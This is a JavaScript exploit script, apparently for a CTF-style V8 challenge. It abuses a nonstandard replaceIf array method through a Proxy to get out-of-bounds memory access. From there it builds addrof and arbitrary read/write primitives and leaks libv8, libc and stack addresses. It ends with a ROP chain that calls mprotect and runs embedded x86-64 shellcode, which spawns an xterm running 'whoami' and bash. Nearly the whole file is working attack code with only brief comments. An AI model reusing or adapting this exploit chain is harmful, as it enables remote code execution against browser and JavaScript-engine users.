function jit(x){
	return  1*x;
	//readline();
};

for(let i = 0; i < 1000000; i++){
jit(1);
}

console.log("End JIT");

let conva = new ArrayBuffer(8);
let convi = new Uint32Array(conva);
let convf = new Float64Array(conva);

let toBig = (f) => {
    convf[0] = f;
    let b = BigInt(convi[1]) << 32n;
    b += BigInt(convi[0]);
    return b;
}
// Bigint to float
let fromBig = (b) => {
    convi[0] = Number(b & 0xffffffffn);
    convi[1] = Number(b >> 32n);
    return convf[0];
}

let target_float_array = new Array(10);
target_float_array.fill(1.2);


let target_js_array = new Array(11);
target_js_array.fill({});

var arrayBuf1 = new ArrayBuffer(0xa00);
let viewer = new Uint32Array(arrayBuf1);

var typedArray2 = new ArrayBuffer(0x200);//Just used to make it easier to modify the first typed array
//Otherwise we have to deal with float to int trash (actually seems really annoying)



let float_proxy = new Proxy(target_float_array, {
    get: function(obj, prop) {
        if (prop == 'length')
            return 0xffffffff;
        return obj[prop];
    }
});


let readOutOfBounds = function(i){
    var n;
    float_proxy.replaceIf(i, function(d){
    n=toBig(d);
    return false;
    },
 0);
    return n;
}

let writeOutOfBounds = function(i,value){
    if (typeof(value) == 'bigint'){
        value = fromBig(value);
    }
    float_proxy.replaceIf(i,function(d){
    return true;
    },value);
}


var target_js_array_idx;
var seen=0;
for(let i = 5; i < 100; i++){
	let res = readOutOfBounds(i);
	if(res == 0x0000000b00000000){
		target_js_array_idx = i;
		break;
	}
}

console.log("Addr Of Array Offset: 0x" + target_js_array_idx.toString(16));
for(let i = 0; i < 5; i++){
console.log("");
}

target_js_array[0]={x:1};





//was here
jit();
target_js_array[0]=jit;

let addrof = function(obj){
	target_js_array[0]=obj;
	return readOutOfBounds(target_js_array_idx+5);//5 by trial and error.
}

console.log("JIT [Function]: 0x" + addrof(jit).toString(16));




var typed_array_off;
for(let i = 0; i < 200; i++){
        let res = readOutOfBounds(i);
        if(res == 0x000000a0000000000){
                typed_array_off = i;
                break;
        }
}

console.log(typed_array_off);
console.log("Typed Array: 0x" + addrof(arrayBuf1).toString(16));

console.log("Backing Store: 0x" + readOutOfBounds(typed_array_off+1).toString(16));
//%OptimizeFunctionOnNextCall(jit);
jit();


//Make one typed array point to the other. Then access things with a Uint32Buffer
//This makes it MUCH easier to deal with changing the backing_store pointer to what we want.
let typed_array_addr1 = addrof(typedArray2)-1n;//ptr tagging
writeOutOfBounds(typed_array_off+1,typed_array_addr1);
console.log("New Backing Store: 0x" + readOutOfBounds(typed_array_off+1).toString(16));
let AbsView = new Uint32Array(arrayBuf1);

//Pretty much the backing_store of arrayBuf1 is the address of typedArray2.
let read = function(addr) {
    AbsView[8] = Number(addr & 0xffffffffn);
    AbsView[9] = Number(addr >> 32n);
    let buff = new Uint32Array(typedArray2);
    let v = BigInt(buff[1]) << 32n;
    v += BigInt(buff[0]);
    return v;
};

let writeQ = function(addr, value){
    AbsView[8] = Number(addr & 0xffffffffn);
    AbsView[9] = Number(addr >> 32n);
    let buf = new Uint32Array(typedArray2);
    buf[0] = Number(value & 0xffffffffn);
    buf[1] = Number(value >> 32n);
    return new Uint8Array(typedArray2);
};


let writeU8 = function(addr, value){
    AbsView[8] = Number(addr & 0xffffffffn);
    AbsView[9] = Number(addr >> 32n);
    let buf = new Uint8Array(typedArray2);
    buf[0]=value;
};


jitAddr = read(addrof(jit)-1n + 0x30n) -1n + 0x40n;
console.log("JIT CODE: 0x"+ jitAddr.toString(16));


let arb_uint8 = function(addr) {
    AbsView[4*2] = Number(addr & 0xffffffffn);
    AbsView[4*2+1] = Number(addr >> 32n);
    return new Uint8Array(typedArray2);
}

let arb_u32 = function(addr) {
    AbsView[4*2] = Number(addr & 0xffffffffn);
    AbsView[4*2+1] = Number(addr >> 32n);
    return new Uint32Array(typedArray2);
}


//whoami
let shellcode = [0x48, 0x8b, 0xec, 0xe8, 0x1d, 0x0, 0x0, 0x0, 0x6a, 0x3c, 0x58, 0xf, 0x5, 0x56, 0x57, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x8b, 0xf8, 0x6a, 0x3b, 0x58, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xd1, 0xf, 0x5, 0xc9, 0x5f, 0x5e, 0xc3, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x8d, 0x64, 0x24, 0xa8, 0x48, 0x8d, 0x5, 0x74, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xa8, 0x48, 0x8d, 0x5, 0x66, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xb0, 0x48, 0x8d, 0x5, 0xbb, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xb8, 0x6a, 0x0, 0x8f, 0x45, 0xc0, 0x48, 0x8d, 0x5, 0x68, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x8d, 0x5, 0x52, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xd8, 0x48, 0x8d, 0x5, 0x62, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xe0, 0x48, 0x8d, 0x5, 0x62, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xe8, 0x48, 0x8d, 0x5, 0x6d, 0x0, 0x0, 0x0, 0x48, 0x89, 0x45, 0xf0, 0x6a, 0x0, 0x8f, 0x45, 0xf8, 0x48, 0x8d, 0x5, 0x12, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0xa8, 0x48, 0x8d, 0x4d, 0xd0, 0xe8, 0x69, 0xff, 0xff, 0xff, 0xc9, 0xc3, 0x2d, 0x65, 0x0, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x0, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x0, 0x53, 0x48, 0x45, 0x4c, 0x4c, 0x3d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x0, 0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x0, 0x58, 0x54, 0x45, 0x52, 0x4d, 0x5f, 0x53, 0x48, 0x45, 0x4c, 0x4c, 0x3d, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x0, 0x5f, 0x3d, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x74, 0x72, 0x61, 0x63, 0x65, 0x0, 0x77, 0x68, 0x6f, 0x61, 0x6d, 0x69, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x22, 0x50, 0x57, 0x4e, 0x45, 0x44, 0x22, 0x3b, 0x62, 0x61, 0x73, 0x68, 0x0];


array_addr = addrof(Array)-1n;

console.log("Array Address: 0x" + array_addr.toString(16));
array_constructor_jit = read(array_addr+0x30n)-1n;
console.log("Array_Constructor_JIT: 0x"+array_constructor_jit.toString(16));
v8_ptr = read(array_constructor_jit+0x42n);
console.log("v8 ptr: 0x" + v8_ptr.toString(16));

//Originally I was planning on making the same exploit work in chrome and d8. I somewhat stopped bothering, but this is still here. Probably the only change to the rest would be to change 7e3 to whatever it is in v8.
if (typeof document == 'undefined'){
	console.log("v8");
	libv8Base=v8_ptr-0x216abc0n;
	libv8gotstart=libv8Base+0x25cd000n;
	console.log("Clock_get_time in got: 0x"+(libv8gotstart+0x9b000n).toString(16));
	clock_get_time=read(libv8gotstart+0x9b000n);
	var libc_base = clock_get_time-0x115850n;
	var cc_addr = libv8Base+0xcb616fn;
	console.log("Libc base: 0x" + libc_base.toString(16));
}else{
	console.log("Chrome");
	var chromeBase=v8_ptr-67439776n;
	clock_get_time=read(0x8d81110n+chromeBase);
	var libc_base = clock_get_time-0x115850n;
	console.log("Libc base: 0x" + libc_base.toString(16));
}
cc_addr=libc_base+0x2e2f8n;
environ=libc_base+0x3c6f38n;
console.log("Environ: 0x"+environ.toString(16));
stack_ptr = read(environ);
console.log("Stack Pointer: 0x"+stack_ptr.toString(16));



rsp_region=stack_ptr-0x1500n;
console.log("RSP at about: 0x"+rsp_region.toString(16));
builtin_js_addr = 0n;

pop_rdi = 0x0000000000021102n+libc_base;
pop_rsi = 0x00000000000202e8n+libc_base;
pop_rdx = 0x0000000000001b92n+libc_base;
mprotect = 0x0000000000101770n+libc_base;

console.log("Get_clock: 0x" + (read(0x8d81110n+chromeBase)-0x115850n).toString(16));

//We right our shellcode onto the stack where environ used to be.
sc_addr=environ;//&(~(0xffffn));
base =sc_addr%4096n;
console.log(base);
sc_addr=sc_addr-base;
arb_uint8(sc_addr).set(shellcode);

//Not sure why there are 2 sc_addr. I might have just chosen a bad rop chain lol. All I know is that this fixed it.
let rop = [
pop_rdi,
sc_addr,
sc_addr,
pop_rsi,
4096n,
pop_rdx,
0x7n,
mprotect,
sc_addr
];

//prompt();
console.log("Get_clock: 0x" + (read(0x8d81110n+chromeBase)-0x115850n).toString(16));
console.log("sc_addr: 0x" + sc_addr.toString(16));

//Attacking Builtins_JSEntryTrampoline+99 on the stack
for(let offset = 0n; offset < 0x3000n; offset=offset+8n){
	addr=rsp_region-offset;
	res = read(addr);
	if(res.toString(16).endsWith("7e3")){
		console.log("0x"+read(addr).toString(16));
		builtin_js_addr = addr;
		//break;	
		
	}
}
console.log("Marker: 0x" + (read(0x8d81110n+chromeBase)-0x115850n).toString(16));


//Write our actual ROP. 
console.log(builtin_js_addr.toString(16));
for(i = 0; i < rop.length; i++){
	write_addr=BigInt(i)*8n;
	write_addr+=builtin_js_addr;
	writeQ(write_addr,rop[i]);

}


//prompt();
